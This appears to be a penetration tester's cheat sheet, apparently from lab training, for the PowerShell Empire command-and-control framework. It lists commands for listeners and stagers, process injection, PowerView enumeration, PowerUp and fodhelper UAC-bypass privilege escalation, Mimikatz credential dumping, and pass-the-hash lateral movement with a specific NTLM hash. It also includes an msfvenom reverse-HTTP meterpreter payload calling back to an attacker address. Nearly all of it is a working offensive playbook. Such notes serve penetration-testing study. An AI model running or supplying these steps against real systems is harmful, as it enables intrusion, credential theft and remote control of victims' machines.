#### Empire

```
https://github.com/BC-SECURITY/Empire

https://bc-security.gitbook.io/empire-wiki/quickstart/installation

sudo apt install powershell-empire

sudo powershell-empire server

sudo powershell-empire client

```
##### Empire commands

```
help

listeners

uselistener http

info

options

set Host 192.168.119.175

execute

back

usestager windows/launcher_bat

info

set Listener http

execute

```

After connection

```

(Empire: stager/windows/launcher_bat) > agents

interact <agent name>

sysinfo

ps

psinject http 3568    ---- migrate payload

agents



```
##### PowerShell Modules

```
usemodule

usemodule situational_awareness/network/powerview/get_user   ----- old

usemodule powershell/situational_awareness/network/powerview/get_user

info

execute

usemodule powershell/privesc/powerup/allchecks

execute

usemodule privesc/bypassuac_fodhelper   ---- old

usemodule powershell/privesc/bypassuac_fodhelper

info

usemodule powershell/credentials/mimikatz/logonpasswords

```

Lateral movement

```
usemodule lateral_movement/invoke_smbexec   ---- old

usemodule powershell/lateral_movement/invoke_smbexec

set ComputerName client251

set Listener http

set Username jeff_admin

set Hash e2b475c11da2a0748290d87aa966c327

set Domain corp.com

execute

```

Switching between empire and metasploit

```

kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.11.0.4 LPORT=7777 - f exe -o met.exe

msf5> use multi/handler
> set payload windows/meterpreter/reverse_http
set LPORT 7777
set LHOST 10.11.0.4

exploit


Empire: S2Y5XW1L) > upload /home/kali/met.exe

shell dir
 
shell C:\Users\offsec.corp\Downloads>met.exe

opens meterpreter session


(Empire: listeners) > usestager windows/launcher_bat
set listener http
execute

meterpreter > upload /tmp/launcher.bat
shell
dir
launcher.bat

```


##### Empire Privesc module - uac bypass

https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc

c:\windows\system32\wscript.exe
c:\windows\system32\eventvwr.exe
fodhelper.exe - uac bypacc 

#
